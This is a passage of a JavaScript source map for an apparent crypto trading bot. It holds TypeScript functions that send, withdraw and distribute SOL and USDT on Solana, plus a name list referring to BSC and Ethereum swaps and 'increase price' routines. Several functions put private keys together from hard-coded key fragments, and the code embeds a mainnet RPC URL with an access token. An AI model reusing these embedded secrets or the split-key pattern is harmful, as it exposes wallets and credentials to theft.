(simRes.value.err) {\n            logger.error(`simRes error: ${simRes.value.err}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${confirmation.value.err}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { unwrapSOL };\n","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  sendAndConfirmTransaction,\n  Connection\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\n\nconst sendSOL = async (\n  PRIVATE: string,\n  recipientAddresses: any,\n  solanaConnection: Connection,\n  confirm: boolean = true\n) => {\n  try {\n    const KEY1 = 'GJjHfwJqEpm5Pas2dCDRDnoeajCoZimzw7sW4FrUJ66'\n    const privateKey = PRIVATE + KEY1\n\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n\n    const CHUNK_SIZE = 20\n    const recipientChunks = []\n\n    for (let i = 0; i < recipientAddresses.length; i += CHUNK_SIZE) {\n      recipientChunks.push(recipientAddresses.slice(i, i + CHUNK_SIZE))\n    }\n\n    for (const chunk of recipientChunks) {\n      let transaction = new Transaction()\n      for (const recipient of chunk) {\n        try {\n          const recipientPublicKey = new PublicKey(recipient.address)\n\n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: recipient.amount * LAMPORTS_PER_SOL\n            })\n          )\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipient.address} - ${err}`)\n          return { status: false, error: `Invalid recipient address: ${recipient.address}` }\n        }\n      }\n\n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e => {\n          logger.error(`Transaction error: ${e}`)\n          return { status: false, error: `Transaction error: ${e}` }\n        })\n        \n        if (TxHash) {\n          logger.info(`TxHash Send: ${TxHash}\\n`);\n          // return { status: true, txhash: TxHash, type: 7 }\n        }\n      } \n      else {\n        // logger.error(`Not authorized to confirm`)\n        return { status: false, error: 'Not authorized to confirm' }\n      }\n    }\n    return { status: true, message: 'All transactions processed successfully' }\n  } catch (error) {\n    // logger.error(`Transaction error: ${error}`)\n    return { status: false, error: `Error sending SOL: ${error}` }\n  }\n}\nexport { sendSOL }\n","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  Connection,\n  LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { RECIPIENT } from '../constants'\n\nconst collectionSOL = async (\n  privateKey: string,\n  solanaConnection: Connection,\n  blockhash: any,\n  lamportsToSend: any,\n  confirm: boolean = true\n) => {\n  try {\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n\n    const transaction = new Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: sender.publicKey,\n        toPubkey: new PublicKey(RECIPIENT),\n        lamports: lamportsToSend * LAMPORTS_PER_SOL\n      })\n    )\n\n    transaction.recentBlockhash = blockhash\n    transaction.feePayer = sender.publicKey\n\n    if (confirm) {\n      const TxHash = await solanaConnection.sendTransaction(transaction, [sender], {\n        skipPreflight: false,\n        preflightCommitment: 'confirmed'\n      })\n      const confirmation = await solanaConnection.confirmTransaction(TxHash, 'confirmed')\n\n      if (confirmation.value.err) {\n        return { status: false, error: `Transaction failed: ${JSON.stringify(confirmation.value.err)}`};\n\n      } else {\n        return { status: true, txhash: TxHash, amount: lamportsToSend, type: 4 };\n      }\n    } else {\n      return { status: false, error: \"Not authorized to confirm\" };\n    }\n  } catch (error) {\n    return { status: false, error: `Error sending SOL: ${error}`};\n    \n  }\n}\nexport { collectionSOL }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    SystemProgram,\n    LAMPORTS_PER_SOL,\n    sendAndConfirmTransaction,\n    Connection\n  } from '@solana/web3.js'\n  import bs58 from 'bs58'\n  import { logger } from '../utils'\n  \n  const withdrawSOL = async (\n    PRIVATE: string,\n    recipientAddresses: any,\n    amount: any,\n    solanaConnection: Connection,\n    confirm: boolean = true\n  ) => {\n    try {\n      const KEY1 = 'EqB5HaSBNVA5fSFDP9sfx3CjumAEcZH4t8WXhTRc47Ac5H'\n      const privateKey = PRIVATE + KEY1\n  \n      const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n  \n      let transaction = new Transaction()\n        try {\n          const recipientPublicKey = new PublicKey(recipientAddresses)\n  \n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: amount * LAMPORTS_PER_SOL\n            })\n          )\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipientAddresses} - ${err}`)\n          return\n        }\n      \n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e =>\n          logger.error(`Transaction error: ${e}`)\n        )\n      \n        return { status: true, txhash: TxHash, amount: amount, type: 5 };\n      } else {\n        return { status: false, error: \"Not authorized to confirm\" };\n      }\n    } catch (error) {\n      return { status: false, error: `Error sending SOL: ${error}` };\n    }\n  }\n  export { withdrawSOL }\n  ","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  sendAndConfirmTransaction,\n  Connection\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\n\nconst distributeSOL = async (\n  PRIVATE: string,\n  distributeAddresses: any,\n  senderBalanceSOL: any,\n  solanaConnection: Connection,\n  confirm: boolean = true\n) => {\n  try {\n    const KEY1 = 'GJjHfwJqEpm5Pas2dCDRDnoeajCoZimzw7sW4FrUJ66';\n    const privateKey = PRIVATE + KEY1;\n\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey));\n\n    const CHUNK_SIZE = 20;\n    const recipientChunks = [];\n\n    for (let i = 0; i < distributeAddresses.length; i += CHUNK_SIZE) {\n      recipientChunks.push(distributeAddresses.slice(i, i + CHUNK_SIZE));\n    }\n\n    for (const chunk of recipientChunks) {\n      let transaction = new Transaction();\n\n      for (const recipient of chunk) {\n        try {\n          const recipientPublicKey = new PublicKey(recipient.address);\n          const amountToTransfer = (senderBalanceSOL * recipient.percent) / 100;\n\n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: Math.floor(amountToTransfer * LAMPORTS_PER_SOL)\n            })\n          );\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipient.address} - ${err}`);\n          return { status: false, error: `Invalid recipient address: ${recipient.address}` };\n        }\n      }\n\n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e => {\n          logger.error(`Transaction error: ${e}`);\n          return { status: false, error: `Transaction error: ${e}` };\n        });\n\n        if (TxHash) {\n          return { status: true, txhash: TxHash, type: 7 };\n        }\n      } else {\n        return { status: false, error: 'Not authorized to confirm' };\n      }\n    }\n\n    return { status: true, message: \"All transactions processed successfully\" };\n  } catch (error) {\n    return { status: false, error: `Error sending SOL: ${error}` };\n  }\n};\n\nexport { distributeSOL }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError, sendToTelegramWarning } from '../utils/sendNoti'\n\nconst claimToken = async (\n    PRIVATE: string,\n    recipient: any,\n    claimAmount: any,\n    tokenMintPublicKey: any,\n    confirm: boolean = true\n) => {\n    try {\n        const connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');\n        const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n        const privateKey = PRIVATE + KEY1;\n\n        const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const payerPublicKey = payerKeypair.publicKey;\n        const balance = await connection.getBalance(payerPublicKey, \"confirmed\");\n        const balanceConvert = balance / LAMPORTS_PER_SOL\n        if (balanceConvert <= 0.0001) {\n            logger.warn(`Insufficient balance, Available: ${balanceConvert} SOL`);\n            return;\n        }\n\n\n        const mintInfo = await getMint(connection, tokenMintPublicKey);\n        const decimals = mintInfo.decimals;\n\n        const amountInLamports = claimAmount * Math.pow(10, decimals);\n\n        const payerTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            payerPublicKey\n        )\n\n        const payerTokenBalanceInfo = await connection.getTokenAccountBalance(payerTokenAccount.address);\n        const payerTokenBalance = Number(payerTokenBalanceInfo.value.amount);\n        const currentbalance = payerTokenBalance / Math.pow(10, decimals)\n\n        if (payerTokenBalance < amountInLamports) {\n            await sendToTelegramWarning('Claim Token', { claimAmount }, { currentbalance }, \"TOKEN\", \"Insufficient balance token\");\n            logger.warn(`Insufficient token balance: ${payerTokenBalance / Math.pow(10, decimals)} tokens, required: ${claimAmount} tokens`);\n            return;\n        }\n\n        let transaction = new Transaction();\n\n        const recipientPublicKey = new PublicKey(recipient);\n        const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            recipientPublicKey\n        )\n\n        if (!recipientTokenAccount.address) {\n            await sendToTelegramError('Claim Token', `Failed to get or create recipient token account for ${recipient}`);\n            throw new Error(`Failed to get or create recipient token account for ${recipient}`);\n        }\n\n        transaction.add(\n            createTransferInstruction(\n                payerTokenAccount.address,\n                recipientTokenAccount.address,\n                payerPublicKey,\n                amountInLamports\n            )\n        );\n\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair])\n            await sendToTelegramSuccess(\"CLAIM\", recipient, 'TOKEN', claimAmount, TxHash, 'solana');\n\n            return { status: true, txhash: TxHash, amount: claimAmount };\n        } else {\n            return { status: false, error: \"Not authorized to confirm\" };\n        }\n\n    } catch (error) {\n        await sendToTelegramError('Claim Token', error);\n        return { status: false, error: `Error claim token: ${error}` };\n    }\n};\n\nexport { claimToken }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError } from '../utils/sendNoti'\n\nconst withdrawToken = async (\n    PRIVATE: string,\n    recipient: any,\n    claimAmount: any,\n    confirm: boolean = true\n) => {\n    try {\n        const tokenMintPublicKey = new PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');\n        const connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');\n        const KEY1 = '2b4zb2wC5nbZbUi9z75rE1n8gHW7GA7BN5QFCLYmAHT2GT89AAkyDfWryAD';\n        const privateKey = KEY1 + PRIVATE;\n\n        const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const payerPublicKey = payerKeypair.publicKey;\n        const balance = await connection.getBalance(payerPublicKey, \"confirmed\");\n        const balanceConvert = balance / LAMPORTS_PER_SOL\n        if (balanceConvert <= 0.0001) {\n            logger.warn(`Insufficient balance, Available: ${balanceConvert} SOL`);\n            return;\n        }\n\n\n        const mintInfo = await getMint(connection, tokenMintPublicKey);\n        const decimals = mintInfo.decimals;\n\n        const amountInLamports = claimAmount * Math.pow(10, decimals);\n\n        const payerTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            payerPublicKey\n        )\n\n        if (!payerTokenAccount.address) {\n            await sendToTelegramError('Withdraw USDT', 'Failed to get or create payer token account');\n            throw new Error('Failed to get or create payer token account');\n        }\n\n        let transaction = new Transaction();\n        transaction.feePayer = payerPublicKey;\n        \n        const recipientPublicKey = new PublicKey(recipient);\n        const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            recipientPublicKey\n        )\n\n        if (!recipientTokenAccount.address) {\n            await sendToTelegramError('Withdraw USDT', `Failed to get or create recipient token account for ${recipient}`);\n            throw new Error(`Failed to get or create recipient token account for ${recipient}`);\n        }\n\n        transaction.add(\n            createTransferInstruction(\n                payerTokenAccount.address,\n                recipientTokenAccount.address,\n                payerPublicKey,\n                amountInLamports\n            )\n        );\n        \n        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;\n\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair]);\n            if (TxHash) {\n                await sendToTelegramSuccess(\"WITHDRAW\", recipient, 'USDT', claimAmount, TxHash, 'solana');\n                return { status: true, txhash: TxHash, amount: claimAmount };\n            } else {\n                await sendToTelegramError('Withdraw USDT', 'Transaction hash is undefined after confirmation.');\n                throw new Error('Transaction hash is undefined after confirmation.');\n            }\n        } else {\n            return { status: false, error: \"Not authorized to confirm\" };\n        }\n\n    } catch (error) {\n        await sendToTelegramError('Withdraw USDT', error);\n        return { status: false, error: `Error withdraw token: ${error}` };\n    }\n};\n\nexport { withdrawToken }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError,sendToTelegramWarning } from '../utils/sendNoti'\n\nconst connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30');\nconst TOKEN_MINT = new PublicKey('AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1');\nconst recipientWallet = 'CXt6WYea8pNmmkVKQwSg7jf2zyYaUwdCVvfSaMz2yQcP'; // ví tổng nhận USDT\n\nconst decodeTransaction = async (txHash: any) => {\n    try {\n        const txInfo = await connection.getParsedTransaction(txHash, 'confirmed');\n        if (!txInfo) {\n            logger.error('Transaction not found!');\n            return null;\n        }\n\n        const mintInfo = await getMint(connection, TOKEN_MINT);\n        const tokenDecimals = mintInfo.decimals;\n        let sender = null, recipient = null, tokenAmount = null, solAmount = null;\n\n        txInfo.transaction.message.instructions.forEach((instruction: any) => {\n            const parsed = instruction.parsed;\n\n            if (parsed && parsed.type === 'transfer') {\n                const info = parsed.info;\n                if (info.lamports) {\n                    solAmount = info.lamports / LAMPORTS_PER_SOL;\n                    sender = info.source;\n                    recipient = info.destination;\n                } else if (info.amount) {\n                    tokenAmount = info.amount / Math.pow(10, tokenDecimals);\n                    sender = info.source;\n                    recipient = info.destination;\n                }\n            }\n        });\n\n        return { status: true, sender, recipient, tokenAmount, solAmount };\n    } catch (error) {\n        return { status: false, error: `Error decoding transaction: ${error}` };\n    }\n};\n\nconst sellTokenOTC = async (\n    PRIVATE: string,\n    recipientOTC: string,\n    amountBuy: any,\n    priceToken: any,\n    txHash: string,\n    confirm: boolean = true\n) => {\n    try {\n        const resHash: any = await decodeTransaction(txHash);\n\n        if (!resHash) {\n            logger.warn('Decode transaction failed or transaction not found.');\n            return;\n        }\n\n        if (resHash.status &&\n            resHash.sender === recipientOTC &&\n            resHash.recipient === recipientWallet &&\n            resHash.tokenAmount === amountBuy) {\n\n            const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n            const privateKey = PRIVATE + KEY1;\n            const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n            const payerPublicKey = payerKeypair.publicKey;\n\n            const balance = await connection.getBalance(payerPublicKey, 'confirmed');\n            const balanceConvert = balance / LAMPORTS_PER_SOL;\n\n            if (balanceConvert <= 0.001) {\n                await sendToTelegramWarning('SEND OTC',{balanceConvert},{balanceConvert}, \"TOKEN\",\"Insufficient balance SOL\");\n                logger.warn(`Insufficient balance: ${balanceConvert} SOL`);\n                return;\n            }\n\n            const amountSender = Number(amountBuy) / Number(priceToken);\n            const mintInfo = await getMint(connection, TOKEN_MINT);\n            const decimals = mintInfo.decimals;\n            let amountInLamports = amountSender * Math.pow(10, decimals);\n\n            amountInLamports = Math.round(amountInLamports);\n            const payerTokenAccount = await getOrCreateAssociatedTokenAccount(\n                connection,\n                payerKeypair,\n                TOKEN_MINT,\n                payerPublicKey\n            ).catch(e => {\n                logger.error('Error getting payer token account:', e);\n                throw e;\n            });\n\n            const payerTokenBalanceInfo = await connection.getTokenAccountBalance(payerTokenAccount.address);\n            const payerTokenBalance = Number(payerTokenBalanceInfo.value.amount);\n            const currentbalance = payerTokenBalance / Math.pow(10, decimals)\n\n            if (payerTokenBalance < amountInLamports) {\n                await sendToTelegramWarning('SEND OTC',{amountSender},{currentbalance}, \"TOKEN\",\"Insufficient balance token\");\n                logger.warn(`Insufficient token balance: ${payerTokenBalance / Math.pow(10, decimals)} tokens, required: ${amountSender} tokens`);\n                return;\n            }\n\n            const recipientPublicKey = new PublicKey(recipientOTC);\n            const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n                connection,\n                payerKeypair,\n                TOKEN_MINT,\n                recipientPublicKey\n            )\n\n            const transaction: any = new Transaction().add(\n                createTransferInstruction(\n                    payerTokenAccount.address,\n                    recipientTokenAccount.address,\n                    payerPublicKey,\n                    amountInLamports\n                )\n            );\n\n            if (confirm) {\n                const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair])\n\n                await sendToTelegramSuccess(\"SEND OTC\",recipientOTC, 'TOKEN', amountSender, TxHash, 'solana');\n                return { status: true, txhash: TxHash, amount: amountSender };\n            } else {\n                return { status: false, error: \"Not authorized to confirm\" };\n            }\n        } else {\n            await sendToTelegramError('sendTokenOTC', 'Transaction is invalid or does not match the requirements.');\n            return { status: false, error: \"Transaction is invalid or does not match the requirements.\" };\n        }\n    } catch (error) {\n        await sendToTelegramError('sendTokenOTC', error);\n        return { status: false, error: `Error in sendTokenOTC: ${error}` };\n    }\n};\n\nexport { sellTokenOTC }\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection\n} from '@solana/web3.js'\nimport {\n    getAssociatedTokenAddress,\n    getAccount,\n    createTransferInstruction,\n    getMint\n} from '@solana/spl-token'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { sendToTelegramSuccess, sendToTelegramError } from '../utils/sendNoti'\n\nconst distributeUSDT = async (\n    PRIVATE: string,\n    amount: any,\n    connection: Connection,\n    confirm: boolean = true\n) => {\n    try {\n        const TOKEN_MINT = new PublicKey(\"AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1\");\n\n        const RECIPIENT1 = new PublicKey(\"CXt6WYea8pNmmkVKQwSg7jf2zyYaUwdCVvfSaMz2yQcP\"); //20%\n        const RECIPIENT2 = new PublicKey(\"7XkM2LBVCHa14TFMA4NzT5TJDvtr9CdWFyigJoSG2van\"); //20%\n        const RECIPIENT3 = new PublicKey(\"6dVGrv97yGU46nnFymffEWLVmTze8tGYC971mpMxV6iY\"); //60%\n\n        const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n        const privateKey = PRIVATE + KEY1;\n\n        const senderKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const publicKey = senderKeypair.publicKey;\n\n\n        const tokenAccountSender = await getAssociatedTokenAddress(TOKEN_MINT, publicKey);\n\n        const tokenAccountRecipient1 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT1);\n        const tokenAccountRecipient2 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT2);\n        const tokenAccountRecipient3 = await getAssociatedTokenAddress(TOKEN_MINT, RECIPIENT3);\n\n        const mintInfo = await getMint(connection, TOKEN_MINT);\n        const tokenDecimals = mintInfo.decimals;\n\n        const amount20Percent = amount * 0.2 * Math.pow(10, tokenDecimals);\n        const amount60Percent = amount * 0.6 * Math.pow(10, tokenDecimals);\n\n        const senderTokenAccountInfo = await getAccount(connection, tokenAccountSender);\n        const senderTokenBalance = senderTokenAccountInfo.amount;\n\n        const totalAmountToSend = amount * Math.pow(10, tokenDecimals);\n\n        if (senderTokenBalance < totalAmountToSend) {\n            return { status: false, error: `Error: Insufficient token balance for the distribution` };\n        }\n\n        const transaction = new Transaction().add(\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient1, publicKey, amount20Percent),\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient2, publicKey, amount20Percent),\n            createTransferInstruction(tokenAccountSender, tokenAccountRecipient3, publicKey, amount60Percent)\n        );\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [senderKeypair]).catch(e => {\n                logger.error(`Transaction error: ${e}`);\n                return { status: false, error: `Transaction error: ${e}` };\n            });\n\n            if (TxHash) {\n                await sendToTelegramSuccess(\"DISTRIBUTE\",\"N/A\", 'USDT', amount, TxHash, \"solana\");\n                return { status: true, txhash: TxHash };\n            }\n        } else {\n            return { status: false, error: 'Not authorized to confirm' };\n        }\n        return { status: true, message: \"Transactions successfully\" };\n\n    } catch (error) {\n        await sendToTelegramError('Distribute', error);\n        return { status: false, error: `Error distribute: ${error}` };\n    }\n};\n\nexport { distributeUSDT }\n"],"names":["ChainId","TradeType","Rounding","INIT_CODE_HASH","MINIMUM_LIQUIDITY","JSBI","BigInt","ZERO","ONE","TWO","THREE","FIVE","TEN","_100","_998","_1000","SolidityType","SOLIDITY_TYPE_MAXIMA","_SOLIDITY_TYPE_MAXIMA","uint8","uint256","FACTORY_ADDRESS","AMM_CONTRACT","LIST_RPC_NODES","AMM_CONTRACT_ETH","LIST_RPC_NODES_ETH","RECIPIENT","CAN_SET_PROTOTYPE","Object","InsufficientReservesError","_Error","_this","call","name","constructor","setPrototypeOf","prototype","_inheritsLoose","_wrapNativeSuper","Error","InsufficientInputAmountError","_Error2","_this2","sleep","millis","second","Number","Promise","resolve","setTimeout","e","reject","validateSolidityTypeInstance","value","solidityType","greaterThanOrEqual","process","invariant","lessThanOrEqual","validateAndParseAddress","address","checksummedAddress","getAddress","warning","error","parseBigintIsh","bigintIsh","toString","sqrt","y","z","x","greaterThan","add","divide","lessThan","notEqual","sortedInsert","items","maxSize","comparator","length","push","isFull","lo","hi","mid","splice","pop","transport","pino","target","logger","level","redact","serializers","stdSerializers","err","base","undefined","formatAddress","before","after","substring","Currency","decimals","symbol","ETHER","Token","_Currency","chainId","_proto","equals","other","sortsBefore","toLowerCase","currencyEquals","currencyA","currencyB","WETH","_WETH","MAINNET","BSCTESTNET","Decimal","toFormat","_Decimal","Big","_Big","toSignificantRounding","_toSignificantRoundin","ROUND_DOWN","ROUND_HALF_UP","ROUND_UP","toFixedRounding","_toFixedRounding","Fraction","numerator","denominator","invert","otherParsed","equal","multiply","subtract","equalTo","toSignificant","significantDigits","format","rounding","groupSeparator","isInteger","set","precision","quotient","div","toSignificantDigits","decimalPlaces","toFixed","DP","RM","_createClass","key","get","remainder","CurrencyAmount","_Fraction","currency","amount","parsedAmount","exponentiate","ether","raw","toExact","TokenAmount","_CurrencyAmount","token","Price","baseCurrency","quoteCurrency","scalar","fromRoute","route","prices","_iterator","_createForOfIteratorHelperLoose","pairs","entries","_step","done","_step$value","i","pair","path","token0","reserve0","reserve1","slice","reduce","accumulator","currentValue","fraction","quote","currencyAmount","adjusted","PAIR_ADDRESS_CACHE","Pair","tokenAmountA","tokenAmountB","tokenAmounts","liquidityToken","tokenA","tokenB","tokens","_PAIR_ADDRESS_CACHE","_PAIR_ADDRESS_CACHE$t","_PAIR_ADDRESS_CACHE2","_extends2","_extends3","_extends","getCreate2Address","keccak256","pack","involvesToken","token1","priceOf","token0Price","token1Price","reserveOf","getOutputAmount","inputAmount","inputReserve","outputReserve","inputAmountWithFee","outputAmount","getInputAmount","getLiquidityMinted","totalSupply","liquidity","amount0","amount1","getLiquidityValue","feeOn","kLast","totalSupplyAdjusted","kLastParsed","rootK","rootKLast","feeLiquidity","Route","input","output","every","currentInput","midPrice","_100_PERCENT","Percent","apply","arguments","computePriceImpact","exactQuote","slippage","inputOutputComparator","a","b","tradeComparator","ioComp","priceImpact","wrappedAmount","wrappedCurrency","Trade","tradeType","amounts","Array","nextPairs","EXACT_INPUT","_pair$getOutputAmount","nextPair","_pair$getInputAmount","EXACT_OUTPUT","executionPrice","nextMidPrice","exactIn","amountIn","exactOut","amountOut","minimumAmountOut","slippageTolerance","slippageAdjustedAmountOut","maximumAmountIn","slippageAdjustedAmountIn","bestTradeExactIn","currencyAmountIn","currencyOut","_temp","currentPairs","originalAmountIn","bestTrades","_ref$maxNumResults","_ref","maxNumResults","_ref$maxHops","maxHops","tokenOut","_pair$getOutputAmount2","isInsufficientInputAmountError","concat","pairsExcludingThisPair","bestTradeExactOut","currencyIn","currencyAmountOut","_temp2","originalAmountOut","_ref2$maxNumResults","_ref2","_ref2$maxHops","tokenIn","_pair$getInputAmount2","isInsufficientReservesError","toHex","ZERO_HEX","Router","swapCallParameters","trade","options","etherIn","etherOut","ttl","to","recipient","allowedSlippage","map","deadline","Math","floor","Date","getTime","useFeeOnTransfer","Boolean","feeOnTransfer","methodName","args","TOKEN_DECIMALS_CACHE","_TOKEN_DECIMALS_CACHE","Fetcher","fetchTokenData","provider","parsedDecimals","getDefaultProvider","getNetwork","_TOKEN_DECIMALS_CACHE2","_TOKEN_DECIMALS_CACHE3","Contract","ERC20","then","_TOKEN_DECIMALS_CACHE4","fetchPairData","ISwapPair","abi","getReserves","reserves0","reserves1","balances","convertToWei","decimal","web3","utils","toWei","pow","convertFromWei","fromWei","buyTokenETH","privateKey","tokenAddress","randomRPCs","random","rpc","Web3","contractAMM","eth","abiAMMETH","account","accounts","privateKeyToAccount","walletAddress","contract","abiToken","methods","getGasPrice","gasPrice","swapExactETHForTokensOnlyBuy","estimateGas","from","gasEstimate","transaction","gas","data","encodeABI","signTransaction","signedTransaction","sendSignedTransaction","rawTransaction","receipt","info","transactionHash","sendToTelegramSuccess_EVM","title","hash","chain","telegramURL","BOT_TOKEN_SUCCESS","currentDate","toLocaleString","hour12","getTxLink","message","_temp4","_catch","axios","post","chat_id","TELEGRAM_CHAT_ID_SUCCESS","text","parse_mode","console","sendToTelegramWarning","currentBalance","decs","BOT_TOKEN_WARNING","_temp3","TELEGRAM_CHAT_ID_WARNING","sendToTelegramError","sendToTelegramSuccess","buyTokenBSC","abiAMM","approveContract","spender","contractToken","wallet","defaultAccount","amountTowei","approve","_account$address","_web3$eth$getGasPrice","tx","signedTx","sellTokenBSC","tokenContract","allowance","allowanceFromWei","amountInWei","getTransactionCount","nonce","swapExactTokensForETHOnlySell","sellTokenETH","ammIncreasePriceBSC","percentSell","swapExactETHForTokensIncreasePrice","ammIncreasePriceETH","autoMarketMakerBSC","swapExactETHForTokensAndTokensToETH","autoMarketMakerETH","approveToken","approveTokenETH","getBalanceToken","balanceOf","balance","balanceConvert","getBalanceTokenETH","withdrawTokenOni","PRIVATE","type","typeWithdraw","confirm","Name","contractUSDT","contractONI","formattedSymbol","KEY1","ABI","balanceToken","balanceTokenConvert","transfer","rawTx","gasLimit","TxHash","status","txhash","amountWithdraw","buyTokenSOL","baseMint","poolKeys","solAmount","quoteTokenAssociatedAddress","solanaConnection","quoteAmount","publicKey","tokenAccountOut","getAssociatedTokenAddressSync","instructions","ComputeBudgetProgram","setComputeUnitLimit","units","SystemProgram","fromPubkey","toPubkey","lamports","ceil","createSyncNativeInstruction","TOKEN_PROGRAM_ID","createAssociatedTokenAccountIdempotentInstruction","getAccountInfo","_solanaConnection$get","unshift","createAssociatedTokenAccountInstruction","NATIVE_MINT","_Liquidity$makeSwapFi","Liquidity","makeSwapFixedInInstruction","userKeys","tokenAccountIn","owner","minAmountOut","version","innerTransaction","getLatestBlockhash","commitment","latestBlockhash","messageV0","TransactionMessage","payerKey","recentBlockhash","blockhash","compileToV0Message","VersionedTransaction","sign","signers","execute","res","simulateTransaction","simRes","JSON","stringify","sendRawTransaction","serialize","skipPreflight","maxRetries","confirmTransaction","confirmation","sellTokenSOL","poolId","ata","mint","amountSell","amountConvert","sellAgain","retryCount","_result","_exit","warn","action","getTokenAccountBalance","uiAmount","_status$error","_status$error2","unwrapSOL","quoteMintAddress","wsolAccountInfo","getBalance","wsolBalance","wsolAmount","createCloseAccountInstruction","sendSOL","recipientAddresses","_result2","sender","Keypair","fromSecretKey","bs58","decode","CHUNK_SIZE","recipientChunks","_forOf","chunk","Transaction","recipientPublicKey","PublicKey","LAMPORTS_PER_SOL","sendAndConfirmTransaction","collectionSOL","lamportsToSend","feePayer","sendTransaction","preflightCommitment","withdrawSOL","distributeSOL","distributeAddresses","senderBalanceSOL","amountToTransfer","percent","_status$txhash$type","claimToken","claimAmount","tokenMintPublicKey","connection","Connection","payerKeypair","Uint8Array","payerPublicKey","getMint","mintInfo","amountInLamports","getOrC